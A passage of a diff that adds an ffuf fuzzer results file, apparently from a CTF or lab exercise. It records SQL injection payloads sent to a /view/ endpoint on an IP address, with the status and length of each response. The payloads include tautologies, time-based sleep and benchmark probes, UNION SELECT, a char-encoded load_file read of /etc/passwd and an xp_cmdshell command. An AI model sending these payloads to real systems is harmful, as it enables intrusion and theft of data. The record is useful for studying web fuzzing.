@@ -1,0 +1,4439 @@
+{
+  "commandline": "ffuf -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt:FUZZ -u http://159.65.81.48:30373/view/1FUZZ -o res.json",
+  "time": "2023-07-29T23:13:15-04:00",
+  "results": [
+    {
+      "input": {
+        "FFUFHASH": "6aaf3a",
+        "FUZZ": "delete"
+      },
+      "position": 10,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 90975521,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1delete",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf328",
+        "FUZZ": "limit"
+      },
+      "position": 40,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 90096978,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1limit",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf36",
+        "FUZZ": "\";waitfor delay '0:0:__TIME__'--"
+      },
+      "position": 6,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 94305956,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\";waitfor delay '0:0:__TIME__'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf313",
+        "FUZZ": ") or ('a'='a"
+      },
+      "position": 19,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 95407997,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1) or ('a'='a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf38",
+        "FUZZ": "||(elt(-3+5,bin(15),ord(10),hex(char(45))))"
+      },
+      "position": 8,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 100610102,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1||(elt(-3+5,bin(15),ord(10),hex(char(45))))",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf37",
+        "FUZZ": "1) or pg_sleep(__TIME__)--"
+      },
+      "position": 7,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 100236278,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11) or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf326",
+        "FUZZ": "0"
+      },
+      "position": 38,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 102967949,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/10",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf319",
+        "FUZZ": "(||6)"
+      },
+      "position": 25,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 103224447,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1(||6)",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf311",
+        "FUZZ": "insert"
+      },
+      "position": 17,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 103586346,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1insert",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf322",
+        "FUZZ": " UNION ALL SELECT"
+      },
+      "position": 34,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 107870217,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 UNION ALL SELECT",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf317",
+        "FUZZ": "1)) or benchmark(10000000,MD5(1))#"
+      },
+      "position": 23,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 107822396,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11)) or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf318",
+        "FUZZ": "asc"
+      },
+      "position": 24,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 109322705,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1asc",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3b",
+        "FUZZ": "like"
+      },
+      "position": 11,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 112366340,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1like",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf316",
+        "FUZZ": "@var select @var as var into temp end --"
+      },
+      "position": 22,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 110617646,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1@var select @var as var into temp end --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf33",
+        "FUZZ": "; execute immediate 'sel' || 'ect us' || 'er'"
+      },
+      "position": 3,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 113445449,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1; execute immediate 'sel' || 'ect us' || 'er'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf31c",
+        "FUZZ": "# from wapiti"
+      },
+      "position": 28,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 118697578,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1# from wapiti",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf324",
+        "FUZZ": ")) or benchmark(10000000,MD5(1))#"
+      },
+      "position": 36,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 122005177,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1)) or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3f",
+        "FUZZ": "declare @q nvarchar (200) 0x730065006c00650063 ..."
+      },
+      "position": 15,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 120372061,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @q nvarchar (200) 0x730065006c00650063 ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf325",
+        "FUZZ": "hi' or 'a'='a"
+      },
+      "position": 37,
+      "status": 200,
+      "length": 2633,
+      "words": 723,
+      "lines": 53,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 124338952,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1hi' or 'a'='a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf321",
+        "FUZZ": "or a = a"
+      },
+      "position": 33,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 129409295,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or a = a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf34",
+        "FUZZ": "benchmark(10000000,MD5(1))#"
+      },
+      "position": 4,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 132078276,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf31",
+        "FUZZ": ")%20or%20('x'='x"
+      },
+      "position": 1,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 135853454,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1)%20or%20('x'='x",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf323",
+        "FUZZ": ") or sleep(__TIME__)='"
+      },
+      "position": 35,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 137694685,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1) or sleep(__TIME__)='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf31e",
+        "FUZZ": "1 waitfor delay '0:0:10'--"
+      },
+      "position": 30,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 136547818,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11 waitfor delay '0:0:10'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf31b",
+        "FUZZ": "\" or benchmark(10000000,MD5(1))#"
+      },
+      "position": 27,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 135603079,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\" or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf320",
+        "FUZZ": "hi or 1=1 --\""
+      },
+      "position": 32,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 146202186,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1hi or 1=1 --\"",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3d",
+        "FUZZ": "pg_sleep(__TIME__)--"
+      },
+      "position": 13,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 148630271,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf315",
+        "FUZZ": "*|"
+      },
+      "position": 21,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 216720511,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1*|",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf314",
+        "FUZZ": "; exec xp_regread"
+      },
+      "position": 20,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 220228741,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1; exec xp_regread",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf35",
+        "FUZZ": "update"
+      },
+      "position": 5,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 223150455,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1update",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf329",
+        "FUZZ": " or 1=1"
+      },
+      "position": 41,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 224118792,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 1=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf31a",
+        "FUZZ": "\"a\"\" or 3=3--\""
+      },
+      "position": 26,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 226408470,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\"a\"\" or 3=3--\"",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf31d",
+        "FUZZ": " or 0=0 --"
+      },
+      "position": 29,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 227314282,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 0=0 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf39",
+        "FUZZ": "\"hi\"\") or (\"\"a\"\"=\"\"a\""
+      },
+      "position": 9,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 231599836,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\"hi\"\") or (\"\"a\"\"=\"\"a\"",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf310",
+        "FUZZ": " or 0=0 #"
+      },
+      "position": 16,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 232242029,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 0=0 #",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf31f",
+        "FUZZ": " or 'a'='a"
+      },
+      "position": 31,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 232871385,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 'a'='a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf312",
+        "FUZZ": "1) or sleep(__TIME__)#"
+      },
+      "position": 18,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 232202735,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11) or sleep(__TIME__)#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3c",
+        "FUZZ": "\" or sleep(__TIME__)#"
+      },
+      "position": 12,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 233477769,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\" or sleep(__TIME__)#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf3e",
+        "FUZZ": "*(|(objectclass=*))"
+      },
+      "position": 14,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 235095905,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1*(|(objectclass=*))",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf32",
+        "FUZZ": "%20or%201=1"
+      },
+      "position": 2,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 235631315,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1%20or%201=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf32a",
+        "FUZZ": " or 2 > 1"
+      },
+      "position": 42,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 83037758,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 2 > 1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf32c",
+        "FUZZ": "PRINT"
+      },
+      "position": 44,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 84956247,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1PRINT",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf32b",
+        "FUZZ": "\")) or benchmark(10000000,MD5(1))#"
+      },
+      "position": 43,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 87738627,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\")) or benchmark(10000000,MD5(1))#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf32e",
+        "FUZZ": " or 3=3"
+      },
+      "position": 46,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 84507209,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 3=3",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf32d",
+        "FUZZ": "hi') or ('a'='a"
+      },
+      "position": 45,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 135580455,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1hi') or ('a'='a",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf330",
+        "FUZZ": "a' waitfor delay '0:0:10'--"
+      },
+      "position": 48,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 136098724,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1a' waitfor delay '0:0:10'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf32f",
+        "FUZZ": "));waitfor delay '0:0:__TIME__'--"
+      },
+      "position": 47,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 137547698,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1));waitfor delay '0:0:__TIME__'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf331",
+        "FUZZ": "1;(load_file(char(47,101,116,99,47,112,97,115, ..."
+      },
+      "position": 49,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 139364200,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11;(load_file(char(47,101,116,99,47,112,97,115, ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf334",
+        "FUZZ": "or 1=1"
+      },
+      "position": 52,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 136997767,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or 1=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf333",
+        "FUZZ": "1 or sleep(__TIME__)#"
+      },
+      "position": 51,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 140870947,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/11 or sleep(__TIME__)#",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf332",
+        "FUZZ": "or%201=1"
+      },
+      "position": 50,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 140557276,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1or%201=1",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf336",
+        "FUZZ": " or '7659'='7659"
+      },
+      "position": 54,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 140962553,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or '7659'='7659",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf337",
+        "FUZZ": " or 'text' = n'text'"
+      },
+      "position": 55,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 142700609,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 'text' = n'text'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf338",
+        "FUZZ": " --"
+      },
+      "position": 56,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 140847981,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf335",
+        "FUZZ": " and 1 in (select var from temp)--"
+      },
+      "position": 53,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 146965960,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 and 1 in (select var from temp)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf33c",
+        "FUZZ": "; exec master..xp_cmdshell 'ping 172.10.1.255'--"
+      },
+      "position": 60,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 135546725,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1; exec master..xp_cmdshell 'ping 172.10.1.255'--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf33a",
+        "FUZZ": "declare @s varchar (200) select @s = 0x73656c6 ..."
+      },
+      "position": 58,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 139985700,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1declare @s varchar (200) select @s = 0x73656c6 ...",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf339",
+        "FUZZ": " or 1=1 or ''='"
+      },
+      "position": 57,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 141706552,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 1=1 or ''='",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf33d",
+        "FUZZ": "3.10E+17"
+      },
+      "position": 61,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 135899120,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/13.10E+17",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf33e",
+        "FUZZ": "\" or pg_sleep(__TIME__)--"
+      },
+      "position": 62,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 130564909,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1\" or pg_sleep(__TIME__)--",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf33b",
+        "FUZZ": "exec xp"
+      },
+      "position": 59,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 145916261,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1exec xp",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf33f",
+        "FUZZ": "x' AND email IS NULL; --"
+      },
+      "position": 63,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 131700301,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1x' AND email IS NULL; --",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf341",
+        "FUZZ": "admin' or '"
+      },
+      "position": 65,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 202911380,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1admin' or '",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf340",
+        "FUZZ": "&"
+      },
+      "position": 64,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 206929386,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1&",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf342",
+        "FUZZ": " or 'unusual' = 'unusual'"
+      },
+      "position": 66,
+      "status": 500,
+      "length": 265,
+      "words": 33,
+      "lines": 6,
+      "content-type": "text/html; charset=utf-8",
+      "redirectlocation": "",
+      "scraper": {},
+      "duration": 204875446,
+      "resultfile": "",
+      "url": "http://159.65.81.48:30373/view/1 or 'unusual' = 'unusual'",
+      "host": "159.65.81.48:30373"
+    },
+    {
+      "input": {
+        "FFUFHASH": "6aaf345",
+        "FUZZ": "1) or benchmark(10000000,MD5(1))#"
